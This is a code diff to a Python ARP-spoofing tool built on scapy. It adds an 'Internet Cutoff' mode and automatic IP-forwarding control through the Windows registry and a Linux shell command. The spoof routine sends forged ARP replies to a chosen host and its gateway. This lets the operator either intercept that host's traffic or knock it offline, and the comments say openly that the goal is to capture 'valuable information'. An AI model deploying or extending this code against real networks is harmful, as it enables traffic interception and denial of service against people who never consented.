@@ -1,3 +1,4 @@
+from scapy import interfaces
 import scapy.all as scapy
 from pick import pick # Pick is used to create interactive menus
 import sys
@@ -8,6 +9,7 @@ import os
 import nmap
 import netifaces
 import socket
+import winreg
 
 # Available flags
 flags = {
@@ -22,6 +24,7 @@ options = [
     "ARP Spoofer",
     "ARP Table",
     "Connected Machines",
+    "Internet Cutoff",
     "Help",
     "Quit"
 ]
@@ -80,6 +83,7 @@ def getMAC(ip, verbose = False, showPacket = False):
 
     except:
         print("Unable to get MAC Address for [{}]".format(ip))
+        return 0
 
 
 # Check if passed IP address is a valid IP address
@@ -110,6 +114,18 @@ def ip2Bin(ip):
     octetListBin = [format(int(i), '08b') for i in octetListInt]
     binary = ("").join(octetListBin)
     return binary
+
+# Returns my network interface
+def getMyInterface(ip):
+    interfaces = netifaces.interfaces() # Get all network interfaces of my machine
+
+    # Loop through the interfaces and look for the main one
+    for interface in interfaces:
+        ifaddrInterface = netifaces.ifaddresses(interface)
+        if ifaddrInterface.get(2) != None:
+
+            if ifaddrInterface[2][0]['addr'] == ip: # If the network interface IPv4 matches your IPv4
+                return interface # Return my interface
 
 # Get your subnet mask (use it to calculate network ID)
 def getSubnetMask(ip):
@@ -188,26 +204,87 @@ def getNetworkIPs(me = True, gw = True):
         return
 
 
+# Enables ip forwarding on my machine in order to route the packets transmited by the target
+# By itself the spoof() function cuts the access to the internet to the specified target by making the packets pass through my machine
+# In order to get any valuable information we must let the targeted machine reach the internet. Therefore we must do the router's job
+#
+# IP routing can be enabled on Linux by running the following command 'echo 1 >> /proc/sys/net/ipv4/ip_forward'
+# The same can be done on Windows by changing a registry key in 'HKEY_LOCAL_MACHINE \SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\IPEnableRouter'
+def setIPForwarding(setKey):
+    osName = getHostOS() # Get host operating system
+
+    registryPath = r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" # Path to the registry key (Windows)
+    linuxCommand = "echo {} >> /proc/sys/net/ipv4/ip_forward".format(int(setKey)) # Command for Linux
+    
+    print("[+] Attempting to enable/disable IP forwarding")
+
+    if osName == 'nt': # Change the Registry Key if the Host is on Windows
+        try:
+            # Get necessary key
+            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, registryPath, 0, winreg.KEY_ALL_ACCESS)
+            storedValue = winreg.QueryValueEx(key, "IPEnableRouter")[0] # Get previously stored value
+
+            # If the registry key is already set to 1, don't do anything
+            if storedValue == int(setKey) and storedValue == 1:
+                print("[+] Your machine is already configured to route incomming packets")
+                time.sleep(1)
+                return 1
+
+            elif storedValue == int(setKey) and storedValue == 0:
+                print("[+] Your machine is already configured not to route incomming packets")
+                time.sleep(1)
+                return 1 
+
+            # If the key is not yet set, set it
+            winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_DWORD, int(setKey))
+            winreg.CloseKey(key)
+            print("[+] Successfully updated Windows Registry!")
+            return 1
+
+        except:
+            print("[+] An error has occured when attempting to read/write to the Windows Registry. Try running the terminal as admin...")
+            waitForKeyStroke()
+            return 0
+
+    else: # Do the same for Linux (See how much time I saved implementing the same shit for Linux? I would suck your toes, Linus Torvalds)
+        try:
+            os.system(linuxCommand)
+            return 1
+        except:
+            print("[+] An error has occured when attempting to enable/disable IP forwarding. Try running the terminal as root...")
+            waitForKeyStroke()
+            return 0
+    
+
+
 # ARP Spoofer helper function (sends malicious ARP packet)
-def spoof(targetIP, targetMAC, gatewayIP, gatewayMAC):
+def spoof(targetIP, targetMAC, gatewayIP, gatewayMAC, allowThrough = True):
     try:
-        print("Spoofing [{}] (CTRL + C to stop)".format(targetIP))
+        isForwardSet = setIPForwarding(allowThrough) # Enable/Disable IP forwarding
+            
+        # If IP forwarding was successfuly altered:
+        if isForwardSet == 1:
+            print("Spoofing [{}] (CTRL + C to stop)".format(targetIP))
 
-        while True:
-            # Create 2 packets. One will be sent to the default gateway, the other one to the target's machine
-            packet1 = scapy.ARP(op = 2, hwdst = gatewayMAC, pdst = gatewayIP, psrc = targetIP) # This packet will be sent to the default gateway
-            packet2 = scapy.ARP(op = 2, hwdst = targetMAC, pdst = targetIP, psrc = gatewayIP) # This packet will be sent to the target machine
+            while True:
+                # Create 2 packets. One will be sent to the default gateway, the other one to the target's machine
+                packet1 = scapy.ARP(op = 2, hwdst = gatewayMAC, pdst = gatewayIP, psrc = targetIP) # This packet will be sent to the default gateway
+                packet2 = scapy.ARP(op = 2, hwdst = targetMAC, pdst = targetIP, psrc = gatewayIP) # This packet will be sent to the target machine
 
-            # Send both packets
-            scapy.send(packet1, verbose = False)
-            scapy.send(packet2, verbose = False)
+                # Send both packets
+                scapy.send(packet1, verbose = False)
+                scapy.send(packet2, verbose = False)
 
-            # Sleep for 2 seconds (Send an ARP response every 2 seconds)
-            time.sleep(2)
+                # Sleep for 2 seconds (Send an ARP response every 2 seconds)
+                time.sleep(2)
+
+        else:
+            print("Unable to set IP forwarding to '{}'... quiting".format(int(allowThrough)))
+            time.sleep(1.5)
             
     except KeyboardInterrupt:
         print("Keyboard interrupt detected. Exiting ARP Spoofer...")
-        time.sleep(2.5)
+        time.sleep(1.5)
 
 
 # Returns the network address given an IP and a subnet MASK in the CIDR notation (192.168.1.109/24 for example)
@@ -332,6 +409,22 @@ def ARPSpoofer():
                 targetMAC = getMAC(IP2Spoof)
                 gwMAC = getMAC(gw)
 
+                if targetMAC == 0 and gwMAC != 0:
+                    print("Unable to get MAC address for '{}' (target)".format(IP2Spoof))
+                    print("The ARP Spoofer requires both MAC addresses...")
+                    waitForKeyStroke()
+                    return
+                elif targetMAC != 0 and gwMAC == 0:
+                    print("Unable to get MAC address for '{}' (gateway)".format(gw))
+                    print("The ARP Spoofer requires both MAC addresses...")
+                    waitForKeyStroke()
+                    return
+                elif targetMAC == 0 and gwMAC == 0:
+                    print("Unable to get both MAC addresses (target and gateway)")
+                    print("The ARP spoofer requires both MAC addresses...")
+                    waitForKeyStroke()
+                    return
+
                 spoof(IP2Spoof, targetMAC, gw, gwMAC) # Start the spoofer
     
                 
@@ -372,6 +465,22 @@ def ARPSpoofer():
                 defaultGateway = getDefaultGateway()
                 dfGWMAC = getMAC(defaultGateway)
 
+                if MACTarget == 0 and dfGWMAC != 0:
+                     print("Unable to get MAC address for '{}' (target)".format(targetIP))
+                     print("The ARP Spoofer requires both MAC addresses...")
+                     waitForKeyStroke()
+                     return
+                elif MACTarget != 0 and dfGWMAC == 0:
+                     print("Unable to get MAC address for '{}' (gateway)".format(defaultGateway))
+                     print("The ARP Spoofer requires both MAC addresses...")
+                     waitForKeyStroke()
+                     return
+                elif MACTarget == 0 and dfGWMAC == 0:
+                     print("Unable to get both MAC addresses (target and gateway)")
+                     print("The ARP spoofer requires both MAC addresses...")
+                     waitForKeyStroke()
+                     return
+
                 # Spoof
                 spoof(targetIP, MACTarget, defaultGateway, dfGWMAC)
             
@@ -411,6 +520,59 @@ def connectedMachines():
 
         print("\n")
         waitForKeyStroke()
+
+# Cuts off access to the internet to the specified host (works most of the time)
+def internetCutoff():
+    asciiBanner = pyfiglet.figlet_format("Internet Cutoff")
+
+    allMachines = []
+    size = 0
+
+    clearTerminal()
+    print(asciiBanner)
+    print("Please wait while we fetch your network for hosts... (CTRL+C to exit)")
+
+    try:
+        allMachines = getNetworkIPs(False, False) # 'False' flags indicate I don't want to list my IPv4 nor my default gateway
+        size = len(allMachines)
+
+    except KeyboardInterrupt:
+        print("Keyboard interrupt detected, exiting...")
+        time.sleep(1.7)
+
+    if size > 0:
+        print("[+] Found {} machines!".format(size))
+        for i in range(0, size):
+            print("{} - {} ({})".format(i + 1, allMachines[i], socket.gethostbyaddr(allMachines[i])[0]))
+
+        IP2Cut = int(input("Choose the host you wish to cut access to the internet: "))
+        targetIP = allMachines[IP2Cut - 1]
+
+        # Get the MAC address of the specified IP address
+        MACTarget = getMAC(targetIP)
+
+        # Get MAC address of the default gateway
+        defaultGateway = getDefaultGateway()
+        dfGWMAC = getMAC(defaultGateway)
+
+        if MACTarget == 0 and dfGWMAC != 0:
+                print("Unable to get MAC address for '{}' (target)".format(targetIP))
+                print("Spoofing requires both MAC addresses...")
+                waitForKeyStroke()
+                return
+        elif MACTarget != 0 and dfGWMAC == 0:
+                print("Unable to get MAC address for '{}' (gateway)".format(defaultGateway))
+                print("Spoofing requires both MAC addresses...")
+                waitForKeyStroke()
+                return
+        elif MACTarget == 0 and dfGWMAC == 0:
+                print("Unable to get both MAC addresses (target and gateway)")
+                print("Spoofing requires both MAC addresses...")
+                waitForKeyStroke()
+                return
+
+        # Spoof
+        spoof(targetIP, MACTarget, defaultGateway, dfGWMAC, False)
 
 
 def main(argv):
@@ -462,6 +624,9 @@ def main(argv):
             
             if index == 2: # Call connected machines function
                 connectedMachines()
+
+            if index == 3: # Call internet cutoff function
+                internetCutoff()
 
             if index == len(options) - 1:
                 clearTerminal()
